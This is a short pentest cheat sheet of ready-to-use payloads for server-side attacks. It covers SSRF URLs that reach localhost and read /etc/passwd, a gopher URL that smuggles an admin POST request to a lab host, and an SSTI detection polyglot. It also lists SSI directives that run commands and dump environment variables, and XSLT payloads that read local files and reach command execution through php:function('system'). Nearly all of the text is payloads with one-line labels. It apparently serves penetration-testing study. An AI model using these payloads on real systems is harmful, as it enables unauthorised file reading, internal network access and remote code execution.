#web #ssrf #ssti #ssi #xslt

# Server-Side Attacks (SSRF / SSTI / SSI / XSLT)

Related: [injection-attacks](injection-attacks.md) · [http-misconfigurations](http-misconfigurations.md) · [file-inclusion](file-inclusion.md)

## SSRF
```
http://127.0.0.1/
```
Access internal hosts / port-scan via the server.

```
file:///etc/passwd
```
Read local files via the file scheme.

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
Smuggle a full POST request via the gopher scheme. See [http-misconfigurations](http-misconfigurations.md) for localhost-filter bypasses.

## SSTI
```
${{<%[%'"}}%\.
```
Polyglot detection string — a template error indicates SSTI.

## SSI Injection
```
<!--#exec cmd="whoami" -->
```
Execute a command via Server-Side Includes.

```
<!--#printenv -->
```
Dump environment variables (also `<!--#include virtual="index.html" -->`).

## XSLT Injection
```xml
<xsl:value-of select="system-property('xsl:vendor')" />
```
Information disclosure (engine/vendor).

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
LFI via XSLT (also `php:function('file_get_contents',...)`).

```xml
<xsl:value-of select="php:function('system','id')" />
```
RCE when PHP functions are registered.
